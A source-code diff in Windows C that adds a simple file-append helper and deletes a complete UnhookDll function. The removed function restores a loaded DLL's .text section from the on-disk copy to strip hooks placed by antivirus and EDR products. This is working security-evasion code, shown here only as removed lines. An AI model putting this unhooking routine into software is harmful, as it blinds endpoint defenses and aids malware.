@@ -388,6 +388,20 @@ BOOL WriteFileContent(LPCWSTR path, LPBYTE data, DWORD size)
 
 	return result;
 }
+BOOL AppendFileContent(LPCWSTR path, LPBYTE data, DWORD size)
+{
+	BOOL result = FALSE;
+
+	HANDLE file = CreateFileW(path, FILE_GENERIC_READ | FILE_APPEND_DATA, 0, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+	if (file != INVALID_HANDLE_VALUE)
+	{
+		DWORD bytesWritten;
+		result = WriteFile(file, data, size, &bytesWritten, NULL);
+		CloseHandle(file);
+	}
+
+	return result;
+}
 BOOL CreateTempFile(LPBYTE file, DWORD fileSize, LPCWSTR extension, LPWSTR resultPath)
 {
 	BOOL result = FALSE;
@@ -984,69 +998,6 @@ DWORD RvaToOffset(LPBYTE image, DWORD rva)
 		}
 
 		return 0;
-	}
-}
-VOID UnhookDll(LPCWSTR name)
-{
-	if (name)
-	{
-		WCHAR path[MAX_PATH + 1];
-		if (Is64BitOperatingSystem() && BITNESS(32)) StrCpyW(path, L"C:\\Windows\\SysWOW64\\");
-		else StrCpyW(path, L"C:\\Windows\\System32\\");
-
-		StrCatW(path, name);
-
-		// Get original DLL handle. This DLL is possibly hooked by AV/EDR solutions.
-		HMODULE dll = GetModuleHandleW(name);
-		if (dll)
-		{
-			MODULEINFO moduleInfo;
-			i_memset(&moduleInfo, 0, sizeof(MODULEINFO));
-
-			if (GetModuleInformation(GetCurrentProcess(), dll, &moduleInfo, sizeof(MODULEINFO)))
-			{
-				// Retrieve a clean copy of the DLL file.
-				HANDLE dllFile = CreateFileW(path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
-				if (dllFile != INVALID_HANDLE_VALUE)
-				{
-					// Map the clean DLL into memory
-					HANDLE dllMapping = CreateFileMappingW(dllFile, NULL, PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);
-					if (dllMapping)
-					{
-						LPVOID dllMappedFile = MapViewOfFile(dllMapping, FILE_MAP_READ, 0, 0, 0);
-						if (dllMappedFile)
-						{
-							PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((ULONG_PTR)moduleInfo.lpBaseOfDll + ((PIMAGE_DOS_HEADER)moduleInfo.lpBaseOfDll)->e_lfanew);
-
-							for (WORD i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++)
-							{
-								PIMAGE_SECTION_HEADER sectionHeader = (PIMAGE_SECTION_HEADER)((ULONG_PTR)IMAGE_FIRST_SECTION(ntHeaders) + (i * (ULONG_PTR)IMAGE_SIZEOF_SECTION_HEADER));
-
-								// Find the .text section of the hooked DLL and overwrite it with the original DLL section
-								if (!StrCmpIA((LPCSTR)sectionHeader->Name, ".text"))
-								{
-									LPVOID virtualAddress = (LPVOID)((ULONG_PTR)moduleInfo.lpBaseOfDll + (ULONG_PTR)sectionHeader->VirtualAddress);
-									DWORD virtualSize = sectionHeader->Misc.VirtualSize;
-
-									DWORD oldProtect;
-									VirtualProtect(virtualAddress, virtualSize, PAGE_EXECUTE_READWRITE, &oldProtect);
-									i_memcpy(virtualAddress, (LPVOID)((ULONG_PTR)dllMappedFile + (ULONG_PTR)sectionHeader->VirtualAddress), virtualSize);
-									VirtualProtect(virtualAddress, virtualSize, oldProtect, &oldProtect);
-
-									break;
-								}
-							}
-						}
-
-						CloseHandle(dllMapping);
-					}
-
-					CloseHandle(dllFile);
-				}
-			}
-
-			FreeLibrary(dll);
-		}
 	}
 }
 
